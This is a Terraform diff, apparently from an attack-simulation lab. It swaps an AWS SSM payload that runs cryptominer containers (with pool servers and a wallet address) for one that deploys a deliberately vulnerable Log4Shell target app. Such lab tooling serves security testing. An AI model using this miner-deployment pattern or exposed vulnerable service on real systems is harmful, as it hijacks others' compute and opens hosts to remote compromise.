@@ -1,15 +1,9 @@
 locals {
-    nicehash_image = "a2ncer/nheqminer_cpu:latest"
-    nicehash_name = "nicehash"
-    nicehash_server = "equihash.usa.nicehash.com:3357"
-    nicehash_user="foxbones@protonmail.com"
-    minergate_name = "minerd"
-    minergate_image = "mkell43/minerd"
-    minergate_server = "stratum+tcp://eth.pool.minergate.com:45791"
-    minergate_user="3HotyetPPdD6pyGWtZvmMHLcXxmNuWR53C.worker1"
-
+    image = "ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929"
+    name = "log4shell"
+    listen_port=var.listen_port
     payload = <<-EOT
-    LOGFILE=/tmp/attacker_exec_docker_cpuminer.log
+    LOGFILE=/tmp/attacker_exec_docker_log4shell_target.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
@@ -21,18 +15,16 @@ locals {
         sleep 10
     done
     log "docker path: $(which docker)"
-    if [[ `sudo docker ps | grep ${local.nicehash_name}` ]]; then docker stop ${local.nicehash_name}; fi
-    sudo docker run --rm -d --network=host --name ${local.nicehash_name} ${local.nicehash_image} -l ${local.nicehash_server} -u ${local.nicehash_user}
-    if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
-    sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
+    if [[ `sudo docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
+    sudo docker run -d --name ${local.name} -v /tmp:/tmp --rm -p ${local.listen_port}:8080 ${local.image}
     sudo docker ps -a >> $LOGFILE 2>&1
     log "done"
     EOT
     base64_payload = base64encode(local.payload)
 }
 
-resource "aws_ssm_document" "exec_docker_cpuminer" {
-  name          = "exec_docker_cpuminer"
+resource "aws_ssm_document" "exec_docker_log4shell_target" {
+  name          = "exec_docker_log4shell_target"
   document_type = "Command"
 
   content = jsonencode(
@@ -42,7 +34,7 @@ resource "aws_ssm_document" "exec_docker_cpuminer" {
         "mainSteps": [
             {
                 "action": "aws:runShellScript",
-                "name": "exec_docker_cpuminer",
+                "name": "exec_docker_log4shell_target",
                 "precondition": {
                     "StringEquals": [
                         "platformType",
@@ -61,11 +53,11 @@ resource "aws_ssm_document" "exec_docker_cpuminer" {
     })
 }
 
-resource "aws_resourcegroups_group" "exec_docker_cpuminer" {
-    name = "exec_docker_cpuminer"
+resource "aws_resourcegroups_group" "exec_docker_log4shell_target" {
+    name = "exec_docker_log4shell_target"
 
     resource_query {
-        query = jsonencode(var.resource_query_exec_docker_cpuminer)
+        query = jsonencode(var.resource_query_exec_docker_log4shell_target)
     }
 
     tags = {
@@ -74,15 +66,15 @@ resource "aws_resourcegroups_group" "exec_docker_cpuminer" {
     }
 }
 
-resource "aws_ssm_association" "exec_docker_cpuminer" {
-    association_name = "exec_docker_cpuminer"
+resource "aws_ssm_association" "exec_docker_log4shell_target" {
+    association_name = "exec_docker_log4shell_target"
 
-    name = aws_ssm_document.exec_docker_cpuminer.name
+    name = aws_ssm_document.exec_docker_log4shell_target.name
 
     targets {
         key = "resource-groups:Name"
         values = [
-            aws_resourcegroups_group.exec_docker_cpuminer.name,
+            aws_resourcegroups_group.exec_docker_log4shell_target.name,
         ]
     }
 
